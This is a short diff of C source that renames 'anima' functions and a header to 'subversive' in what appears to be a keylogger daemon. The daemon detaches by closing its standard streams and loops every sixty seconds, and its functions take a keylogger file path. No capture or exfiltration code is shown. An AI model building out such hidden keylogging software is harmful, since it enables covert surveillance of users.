@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include "anima_api.h"
+#include "subversive_api.h"
 #include <errno.h>
 #include <poll.h>
 #include <stdio.h>
@@ -113,7 +113,7 @@ int watch_dir_loop(struct watch_dir_struct *w)
 	exit(EXIT_SUCCESS);
 }
 
-void __anima_daemon(const char *keylogger_file)
+void __subversive_daemon(const char *keylogger_file)
 {
 	while (1) {
 		sleep(60);
@@ -121,7 +121,7 @@ void __anima_daemon(const char *keylogger_file)
 	}
 }
 
-void anima_daemon(const char *keylogger_file)
+void subversive_daemon(const char *keylogger_file)
 {
 	pid_t pid;
 
@@ -144,6 +144,6 @@ void anima_daemon(const char *keylogger_file)
 		close(0);
 		close(1);
 		close(2);
-		__anima_daemon(keylogger_file);
+		__subversive_daemon(keylogger_file);
 	}
 }
